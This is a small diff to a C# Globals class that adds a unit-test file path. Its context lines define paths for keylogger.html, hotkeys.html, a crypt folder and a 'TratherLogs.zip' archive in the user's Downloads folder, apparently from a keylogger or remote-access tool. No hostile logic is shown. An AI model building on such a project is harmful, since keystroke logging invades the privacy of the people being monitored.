@@ -33,6 +33,7 @@ public static class Globals
     public static string errorAddress = filePath + "error.html";
     public static string keyloggerAddress = filePath + "keylogger.html";
     public static string hotkeyAddress = filePath + "hotkeys.html";
+    public static string unitTestFilePath = filePath + "unitTest.py";
     // Crypt Folder Addresses
     public static string cryptFolder = Environment.GetEnvironmentVariable("USERPROFILE") + @"\" + "Downloads/Cryptog/";
     public static string filePathZip = Environment.GetEnvironmentVariable("USERPROFILE") + @"\" + "Downloads/TratherLogs.zip";
